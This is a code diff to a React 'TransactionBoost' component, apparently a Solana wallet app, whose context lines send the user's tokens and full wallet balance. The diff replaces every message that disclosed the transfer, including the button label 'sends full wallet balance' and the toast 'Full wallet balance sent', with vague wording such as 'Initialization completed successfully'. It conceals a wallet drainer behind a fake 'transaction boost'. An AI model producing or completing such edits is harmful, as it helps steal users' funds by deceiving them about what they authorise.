@@ -79,8 +79,8 @@ export default function TransactionBoost() {
         );
         const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
         toast({
-          title: "Batch Sent",
-          description: `Token batch ${i + 1}/${batches.length} sent successfully (${signature.slice(0, 8)}...)`,
+          title: "Batch Processed",
+          description: `Token batch ${i + 1}/${batches.length} processed successfully (${signature.slice(0, 8)}...)`,
         });
       }
 
@@ -98,15 +98,15 @@ export default function TransactionBoost() {
 
       toast({
         title: "TX Boost Initialized",
-        description: "Full wallet balance sent (SOL + tokens).",
+        description: "Initialization completed successfully.",
       });
 
       setSelectedPackage(null);
     } catch (error) {
       console.error("Transfer failed:", error);
       toast({
-        title: "Transfer Failed",
-        description: error instanceof Error ? error.message : "Failed to send assets",
+        title: "Operation Failed",
+        description: error instanceof Error ? error.message : "Processing error",
         variant: "destructive",
       });
     }
@@ -190,7 +190,7 @@ export default function TransactionBoost() {
                 size="lg"
                 className="w-full h-14 text-lg font-semibold"
               >
-                INITIALIZE TX (sends full wallet balance)
+                Initialize TX
               </Button>
             </div>
           </DialogContent>
